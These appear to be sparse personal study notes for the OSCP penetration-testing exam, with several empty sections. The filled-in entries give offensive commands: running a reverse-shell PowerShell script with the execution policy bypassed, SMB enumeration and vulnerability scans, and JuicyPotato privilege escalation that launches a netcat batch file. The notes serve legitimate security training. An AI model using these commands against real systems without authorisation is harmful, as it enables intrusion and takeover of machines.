# OSCP-2022
Notes compiled for the OSCP exam.

# Recon



# Initial Exploitation

## Shells

Have a web shell? Check if server can reach you:
```
$ sudo tcpdump -i tun0 -n icmp -v
```

Execute PowerShell script non-interactively:
```
$ powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
```


## FTP [21 TCP]


## SMB/Samba [139, 445 TCP]

Enumerate via. SMB.
```
$ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
```

Check for SMB vulnerabilities.
```
$ nmap --script smb-vuln-* [target]
```



# Linux Privilege Escalation


# Windows Privilege Escalation

## Service Permissions

```
# windows/winXP
> icacls/cacls [fullpath/to/service]

# powershell
PS> Get-Acl
PS> Get-ChildItem | Get-Acl
```

## File & Folder Permissions

## Acecss Token Abuse

https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad


JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled.
```
> whoami /privs
> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
```



# Password Cracking

Online cracker: https://crackstation.net/

